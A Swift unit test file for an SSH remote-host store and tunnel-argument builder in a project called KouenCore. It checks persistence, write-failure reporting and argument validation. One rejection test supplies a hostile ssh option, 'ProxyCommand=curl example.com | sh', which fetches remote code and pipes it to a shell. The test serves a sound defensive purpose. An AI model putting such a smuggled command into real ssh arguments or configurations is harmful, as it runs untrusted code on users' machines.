import XCTest
@testable import KouenCore

final class RemoteHostStoreTests: XCTestCase {
    private var home: URL!
    private var previousHome: String?

    override func setUpWithError() throws {
        previousHome = getenv("KOUEN_HOME").map { String(cString: $0) }
        home = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("kouen-remote-\(UUID().uuidString)", isDirectory: true)
        setenv("KOUEN_HOME", home.path, 1)
        try KouenPaths.ensureDirectories()
    }

    override func tearDownWithError() throws {
        if let previousHome { setenv("KOUEN_HOME", previousHome, 1) } else { unsetenv("KOUEN_HOME") }
        try? FileManager.default.removeItem(at: home)
    }

    func testUpsertLoadRemoveRoundTrip() {
        let store = RemoteHostStore()
        XCTAssertTrue(store.load().isEmpty)

        store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox", remoteSocketPath: "/home/rob/.local/share/kouen/kouen.sock"))
        store.upsert(RemoteHost(name: "build", sshTarget: "ci@build", remoteSocketPath: "/run/user/1000/kouen/kouen.sock", sshArgs: ["-p", "2222"]))

        let loaded = store.load()
        XCTAssertEqual(loaded.count, 2)
        XCTAssertEqual(store.host(named: "build")?.sshArgs, ["-p", "2222"])

        // Upsert replaces by name rather than duplicating.
        store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox2", remoteSocketPath: "/tmp/x.sock"))
        XCTAssertEqual(store.load().count, 2)
        XCTAssertEqual(store.host(named: "devbox")?.sshTarget, "rob@devbox2")

        store.remove(name: "devbox")
        XCTAssertNil(store.host(named: "devbox"))
        XCTAssertEqual(store.load().count, 1)
    }

    func testUpsertReportsSavedTrueOnSuccess() {
        let store = RemoteHostStore()
        let result = store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox", remoteSocketPath: "/tmp/x.sock"))
        XCTAssertTrue(result.saved, "a successful write must report saved == true")
        XCTAssertEqual(result.hosts.count, 1)
    }

    func testUpsertReportsSavedFalseWhenWriteFails() throws {
        // Force the on-disk write to fail in a way that holds even when tests run as root (the
        // Linux CI container — root ignores permission bits, so a chmod-based setup passes the
        // write and fails the test there): replace the sessions *directory* with a regular file.
        // Creating remote-hosts.json (and the flock sidecar, which degrades to unlocked) then
        // fails with ENOTDIR for any uid, and ensureDirectories() can't silently heal it because
        // a file already occupies the path. The mutating API must surface the failure
        // (saved == false) instead of silently swallowing it.
        let sessions = KouenPaths.sessionsDirectory
        let fm = FileManager.default
        try? fm.removeItem(at: sessions)
        fm.createFile(atPath: sessions.path, contents: Data())
        defer {
            try? fm.removeItem(at: sessions)
            try? fm.createDirectory(at: sessions, withIntermediateDirectories: true)
        }

        let store = RemoteHostStore()
        let result = store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox", remoteSocketPath: "/tmp/x.sock"))
        XCTAssertFalse(result.saved, "a failed write must report saved == false")
    }

    /// P39 A — save/load round trip for the Agent Forwarding toggle's `-A` flag, decoupled from
    /// the separate SwiftUI form-reload behavior (a different, unconfirmed concern raised in
    /// manual testing). This is the guarantee Phase A actually depends on: what the UI toggle
    /// writes must survive a real store round trip and still be accepted by the tunnel builder.
    func testAgentForwardingFlagRoundTripsThroughStoreAndIsAcceptedByTunnelBuilder() throws {
        let store = RemoteHostStore()
        store.upsert(RemoteHost(
            name: "devbox", sshTarget: "rob@devbox",
            remoteSocketPath: "/home/rob/.local/share/kouen/kouen.sock", sshArgs: ["-A"]))

        let loaded = store.host(named: "devbox")
        XCTAssertEqual(loaded?.sshArgs, ["-A"], "the exact flag the UI toggle writes must round-trip unchanged")

        let args = try SSHTunnelManager.sshArguments(
            for: try XCTUnwrap(loaded), localSocket: URL(fileURLWithPath: "/tmp/kouen.sock"))
        XCTAssertTrue(args.contains("-A"), "the persisted flag must actually reach the real ssh invocation")
    }

    func testSSHTunnelAllowsSafeUserArgs() throws {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/run/user/1000/kouen/kouen.sock",
            sshArgs: ["-p", "2222", "-i", "/Users/rob/.ssh/id_ed25519", "-Jjumpbox"])

        let args = try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/kouen.sock"))

        XCTAssertEqual(args.suffix(8), [
            "-p", "2222",
            "-i", "/Users/rob/.ssh/id_ed25519",
            "-Jjumpbox",
            "-L", "/tmp/kouen.sock:/run/user/1000/kouen/kouen.sock",
            "ci@build",
        ])
    }

    func testSSHTunnelRejectsCommandExecutingSSHOptions() {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/run/user/1000/kouen/kouen.sock",
            sshArgs: ["-o", "ProxyCommand=curl example.com | sh"])

        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/kouen.sock")))
    }

    func testSSHTunnelRejectsAmbiguousForwardTarget() {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/tmp/kouen.sock:extra")

        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/kouen.sock")))
    }

    func testSSHTunnelRejectsAmbiguousLocalForwardSocket() {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/run/user/1000/kouen/kouen.sock")

        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/kouen:sock")))
    }
}
